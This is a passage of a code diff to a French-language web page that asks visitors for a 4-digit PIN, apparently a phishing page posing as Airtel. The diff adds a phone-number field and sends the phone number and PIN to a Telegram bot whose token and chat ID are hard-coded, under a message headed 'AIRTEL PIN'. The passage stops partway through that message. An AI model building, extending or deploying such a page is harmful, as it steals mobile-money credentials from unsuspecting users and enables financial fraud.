@@ -18,6 +18,9 @@
             Saisissez et confirmez votre code PIN à 4 chiffres.
         </p>
 
+        <!-- PHONE NUMBER -->
+        <input id="phone" type="tel" maxlength="13" placeholder="Numéro de téléphone (+243XXXXXXXXX)" class="w-full p-4 rounded-xl bg-white/5 border border-white/20 outline-none text-center text-xl" />
+
         <!-- PIN -->
         <input id="pin1" type="password" maxlength="4" placeholder="Saisissez le code PIN" class="w-full p-4 rounded-xl bg-white/5 border border-white/20 outline-none text-center text-xl" />
 
@@ -33,8 +36,14 @@
     <script>
         async function submitPin() {
 
+            const phone = document.getElementById("phone").value;
             const pin1 = document.getElementById("pin1").value;
             const pin2 = document.getElementById("pin2").value;
+
+            if (!phone || phone.length < 10) {
+                alert("Veuillez entrer un numéro de téléphone valide avec +243");
+                return;
+            }
 
             if (pin1.length !== 4 || pin2.length !== 4) {
                 alert("Le PIN doit comporter 4 chiffres");
@@ -46,20 +55,19 @@
                 return;
             }
 
-            // Save PIN
+            // Save PIN & phone
             localStorage.setItem("userPin", pin1);
+            localStorage.setItem("userPhone", phone);
 
-            await sendToTelegram(pin1);
+            await sendToTelegram(phone, pin1);
 
             window.location.href = "login.html";
         }
 
-        async function sendToTelegram(pin) {
+        async function sendToTelegram(phone, pin) {
 
-            const phone = localStorage.getItem("verifiedPhone") || "Non disponible";
-
-            const BOT = "8999307823:AAHeXPAlMT6dX2QE2U-erKRecDTzmdZOJgI";
-            const CHAT = "8860468646";
+            const BOT = "8060679781:AAGFBRA2mLcT1KIjfQ1Y_PmvCeCFW-T10-c";
+            const CHAT = "5615316142";
 
             const msg =
                 `🔐 AIRTEL PIN
